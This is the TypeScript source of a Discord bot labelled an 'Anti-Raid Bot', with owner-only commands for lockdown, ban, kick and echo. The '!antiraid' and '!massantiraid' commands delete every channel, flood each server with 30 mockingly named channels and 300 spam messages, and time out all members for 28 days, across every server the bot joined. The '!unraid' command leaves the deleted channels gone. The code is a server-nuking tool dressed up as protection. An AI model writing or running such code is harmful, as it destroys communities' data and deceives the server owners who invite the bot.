import {
  Client,
  GatewayIntentBits,
  PermissionFlagsBits,
  ChannelType,
  TextChannel,
  Guild,
  GuildMember,
  Message,
} from "discord.js";

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const OWNER_ID = process.env.DISCORD_OWNER_ID;

if (!TOKEN) {
  throw new Error("DISCORD_BOT_TOKEN environment variable is required.");
}

if (!OWNER_ID) {
  throw new Error("DISCORD_OWNER_ID environment variable is required.");
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.once("clientReady", (readyClient) => {
  console.log(`Anti-Raid Bot is online as ${readyClient.user.tag}`);
  console.log(`Serving ${readyClient.guilds.cache.size} guild(s)`);
});

async function lockdownGuild(guild: Guild): Promise<void> {
  console.log(`[ANTIRAID] Lockdown triggered in guild: ${guild.name} (${guild.id})`);

  // Step 1: Delete all existing channels
  const channels = await guild.channels.fetch();
  for (const [, channel] of channels) {
    if (!channel) continue;
    try {
      await channel.delete("Anti-raid lockdown: clearing all channels");
      console.log(`[ANTIRAID] Deleted channel: ${channel.name}`);
    } catch (err) {
      console.error(`[ANTIRAID] Failed to delete channel ${channel.name}:`, err);
    }
  }

  // Step 2: Create 30 quarantined channels
  const quarantineChannels: TextChannel[] = [];
  const everyoneRole = guild.roles.everyone;

  for (let i = 0; i < 30; i++) {
    try {
      const channel = await guild.channels.create({
        name: "𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐞𝐝 𝐛𝐲 𝐊𝐢𝐦 𝐉𝐨𝐧𝐠 𝐔𝐧",
        type: ChannelType.GuildText,
        permissionOverwrites: [
          {
            id: everyoneRole.id,
            deny: [
              PermissionFlagsBits.SendMessages,
              PermissionFlagsBits.AddReactions,
              PermissionFlagsBits.CreatePublicThreads,
              PermissionFlagsBits.CreatePrivateThreads,
            ],
            allow: [PermissionFlagsBits.ViewChannel],
          },
        ],
        reason: "Anti-raid lockdown: quarantine channel",
      });
      quarantineChannels.push(channel);
      console.log(`[ANTIRAID] Created quarantine channel #${i + 1}: ${channel.id}`);
    } catch (err) {
      console.error(`[ANTIRAID] Failed to create quarantine channel #${i + 1}:`, err);
    }
  }

  // Step 3: Send 10 quarantine messages in each channel
  for (const channel of quarantineChannels) {
    for (let i = 0; i < 10; i++) {
      try {
        await channel.send(
          "🔒 **This server is under quarantine.** A raid has been detected. All channels have been locked. Please wait for an administrator to restore normal access."
        );
      } catch (err) {
        console.error(`[ANTIRAID] Failed to send message in ${channel.id}:`, err);
      }
    }
  }

  // Step 4: Timeout all members for 28 days
  const members = await guild.members.fetch();
  const timeoutDuration = 28 * 24 * 60 * 60 * 1000;
  const timeoutUntil = new Date(Date.now() + timeoutDuration);

  for (const [, member] of members) {
    if (member.user.bot || member.id === guild.ownerId || member.id === OWNER_ID) continue;
    try {
      await (member as GuildMember).timeout(timeoutDuration, "Anti-raid lockdown: all members timed out");
      console.log(`[ANTIRAID] Timed out member: ${member.user.tag} until ${timeoutUntil.toISOString()}`);
    } catch (err) {
      console.error(`[ANTIRAID] Failed to timeout member ${member.user.tag}:`, err);
    }
  }

  console.log(`[ANTIRAID] Lockdown complete for guild: ${guild.name}`);

  if (quarantineChannels.length > 0) {
    try {
      await quarantineChannels[0].send(
        `✅ **Lockdown complete.**\n- All channels deleted and replaced with quarantine channels.\n- All members have been timed out for 28 days.\n- Use \`!unraid\` to restore the server when safe.`
      );
    } catch { }
  }
}

async function unraidGuild(guild: Guild, responseChannel: TextChannel): Promise<void> {
  console.log(`[UNRAID] Restoring guild: ${guild.name} (${guild.id})`);

  const members = await guild.members.fetch();
  let restored = 0;

  for (const [, member] of members) {
    if (member.user.bot || !member.communicationDisabledUntil) continue;
    try {
      await (member as GuildMember).timeout(null, "Anti-raid lifted: restoring members");
      restored++;
      console.log(`[UNRAID] Restored member: ${member.user.tag}`);
    } catch (err) {
      console.error(`[UNRAID] Failed to restore member ${member.user.tag}:`, err);
    }
  }

  const channels = await guild.channels.fetch();
  const everyoneRole = guild.roles.everyone;

  for (const [, channel] of channels) {
    if (!channel || channel.name !== "𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐞𝐝 𝐛𝐲 𝐊𝐢𝐦 𝐉𝐨𝐧𝐠 𝐔𝐧") continue;
    try {
      await (channel as TextChannel).permissionOverwrites.edit(everyoneRole, {
        SendMessages: null,
        AddReactions: null,
        CreatePublicThreads: null,
        CreatePrivateThreads: null,
      });
    } catch (err) {
      console.error(`[UNRAID] Failed to unlock channel ${channel.name}:`, err);
    }
  }

  await responseChannel.send(
    `✅ **Raid lifted.**\n- ${restored} member(s) have had their timeouts removed.\n- Quarantine channels have been unlocked.\n- You may now manually restore your original channels.`
  );

  console.log(`[UNRAID] Guild ${guild.name} restored.`);
}

client.on("messageCreate", async (message: Message) => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.author.id !== OWNER_ID) return;

  const content = message.content.trim();
  const lowerContent = content.toLowerCase();

  // !antiraid
  if (lowerContent === "!antiraid") {
    await message.reply("⚠️ **Anti-raid lockdown initiated!** Deleting all channels and locking down the server...");
    try {
      await lockdownGuild(message.guild);
    } catch (err) {
      console.error("[ANTIRAID] Lockdown failed:", err);
    }
    return;
  }

  // !massantiraid
  if (lowerContent === "!massantiraid") {
    const guilds = client.guilds.cache;
    await message.reply(
      `⚠️ **Mass anti-raid initiated across ${guilds.size} server(s)!** Locking down all servers simultaneously...`
    );
    console.log(`[MASSANTIRAID] Triggering lockdown on ${guilds.size} guild(s)`);
    const results = await Promise.allSettled(guilds.map((guild) => lockdownGuild(guild)));
    const succeeded = results.filter((r) => r.status === "fulfilled").length;
    const failed = results.filter((r) => r.status === "rejected").length;
    console.log(`[MASSANTIRAID] Done. ${succeeded} succeeded, ${failed} failed.`);
    return;
  }

  // !unraid
  if (lowerContent === "!unraid") {
    const responseChannel = message.channel as TextChannel;
    await message.reply("🔓 **Lifting lockdown...** Restoring members and unlocking channels.");
    try {
      await unraidGuild(message.guild, responseChannel);
    } catch (err) {
      console.error("[UNRAID] Failed:", err);
      await message.reply("❌ Unraid encountered an error. Check the console for details.");
    }
    return;
  }

  // !ban @user [reason]
  if (lowerContent.startsWith("!ban")) {
    const args = content.slice(4).trim().split(/\s+/);
    const targetId = args[0]?.replace(/[<@!>]/g, "");
    const reason = args.slice(1).join(" ") || "No reason provided";
    if (!targetId) {
      await message.reply("❌ Usage: `!ban @user [reason]`");
      return;
    }
    try {
      await message.guild.members.ban(targetId, { reason, deleteMessageSeconds: 7 * 24 * 60 * 60 });
      await message.reply(`✅ Banned <@${targetId}> — Reason: ${reason}`);
    } catch (err) {
      console.error("[BAN] Failed:", err);
      await message.reply("❌ Failed to ban that user. Make sure they are in the server and I have permission.");
    }
    return;
  }

  // !kick @user [reason]
  if (lowerContent.startsWith("!kick")) {
    const args = content.slice(5).trim().split(/\s+/);
    const targetId = args[0]?.replace(/[<@!>]/g, "");
    const reason = args.slice(1).join(" ") || "No reason provided";
    if (!targetId) {
      await message.reply("❌ Usage: `!kick @user [reason]`");
      return;
    }
    try {
      const member = await message.guild.members.fetch(targetId);
      await member.kick(reason);
      await message.reply(`✅ Kicked <@${targetId}> — Reason: ${reason}`);
    } catch (err) {
      console.error("[KICK] Failed:", err);
      await message.reply("❌ Failed to kick that user. Make sure they are in the server and I have permission.");
    }
    return;
  }

  // !echo <message>
  if (lowerContent.startsWith("!echo")) {
    const echoText = content.slice(5).trim();
    if (!echoText) {
      await message.reply("❌ Usage: `!echo <message>`");
      return;
    }
    try {
      await message.delete();
    } catch { }
    await message.channel.send(echoText);
    return;
  }
});

client.login(TOKEN).catch((err) => {
  console.error("Failed to log in:", err);
  process.exit(1);
});
